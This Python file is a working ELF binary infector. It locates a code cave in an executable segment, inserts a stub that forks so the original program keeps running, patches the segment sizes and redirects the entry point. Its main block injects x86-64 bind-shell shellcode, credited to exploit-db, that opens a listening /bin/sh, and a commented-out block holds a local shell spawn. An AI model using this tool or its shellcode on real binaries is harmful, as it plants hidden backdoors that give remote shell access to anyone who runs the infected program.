from utils import parse_args
from parse import elf_info
from struct import pack
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.NOTSET)


class injector:
    def __init__(self, file, inject_code: bytes):
        self.file = file
        self.info = elf_info(self.file)

        code = b''.join([b'\x6a\x39',       # push    0x39
                         b'\x58',           # pop     rax
                         b'\x0f\x05',       # syscall
                         b'\x48\x85\xc0',   # test    rax, rax
                         b'\x74\x0c',       # je      0x16
                                            # movabs  rbp, entry
                         b'\x48\xbd' + pack('<Q', self.info.header['e_entry']),
                         b'\xff\xe5',       # jmp     rbp
                         inject_code])      # inject code
        segs = self.find_cave(len(code))
        if len(segs) == 0:
            logger.error('No cave in the program')
            return

        target_idx = segs[0]['index']
        target = self.info.segments[target_idx]

        code_offset = target['p_offset'] + target['p_filesz']
        logger.info(f'Writing code to 0x{code_offset:x}')
        self.add_machine_code(code_offset, code)

        new_size = target['p_filesz'] + len(code)
        logger.info(f'Writing file/mem size to 0x{new_size:x}')
        self.extend_seg_size(target_idx, new_size)

        code_va = target['p_vaddr'] + target['p_filesz']
        logger.info(f'Writing entry to 0x{code_va:x}')
        self.modify_entry(code_va)

    def verify_cave(self, start: int, len_: int) -> int:
        '''
        Walking through file to verlify cave's size
        '''
        self.file.seek(start)
        count = 0
        while self.file.tell() < start + len_:
            b = self.file.read(1)
            if b == b'\x00':
                count += 1
            else:
                break
        return count

    def find_cave(self, need_size: int):
        '''
        Find the cave in LOAD, exec segment
        cave means segment's file size is smaller than alloc size
        '''
        load_segs = list(filter(lambda x: x['p_type'] == 1,
                                self.info.segments))
        if len(load_segs) <= 0:
            exit(1)

        cave_segs = []
        for i in range(len(load_segs) - 1):
            c_seg = load_segs[i]
            n_seg = load_segs[i + 1]
            # Not a LOAD segments
            if not c_seg['p_flags'] & 1:
                continue

            # First verify
            max_range = c_seg['p_filesz'] + c_seg['p_vaddr']
            if max_range >= n_seg['p_vaddr']:
                continue

            real_size = self.verify_cave(c_seg['p_offset'] + c_seg['p_filesz'],
                                         n_seg['p_vaddr'] - max_range)
            # cave size is too small
            if real_size <= need_size:
                continue

            logger.info(f'Found a {real_size} bytes cave')
            cave_segs.append({'index': self.info.segments.index(c_seg),
                              'cave_size': real_size})
        return cave_segs

    def extend_seg_size(self, seg_pos: int, new_size: int):
        '''
        Patch segment to increase LOAD file size
        '''
        file_pos = self.info.header['e_phoff'] + \
            seg_pos * self.info.header['e_phentsize']
        if self.info.header['e_machine'] == 62:
            file_pos += 32
        # TODO: abstract elf types to adapt more architectures
        else:
            pass
        self.file.seek(file_pos)
        # TODO: static pack size
        self.file.write(pack('<Q', new_size) * 2)

    def add_machine_code(self, pos: int, code: bytes):
        '''
        Add code in the increased LOAD segments
        '''
        self.file.seek(pos)
        self.file.write(code)

    def modify_entry(self, new_entry: int):
        self.file.seek(24)
        self.file.write(pack('<Q', new_entry))


if __name__ == "__main__":
    '''
    # NOP Test
    code = b'\x90\x90\x90'
    # spawn a shell
    code = b'\x48\x31\xf6\x56'
    code += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
    code += b'\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    '''
    # Bind shell: <https://www.exploit-db.com/shellcodes/41128>
    code = b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02"
    code += b"\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0"
    code += b"\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58"
    code += b"\x0f\x05"
    code += b"\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05"
    code += b"\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    code += b"\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
    args = parse_args()
    if args.file:
        with open(args.file, 'rb+') as f:
            injector(f, code)
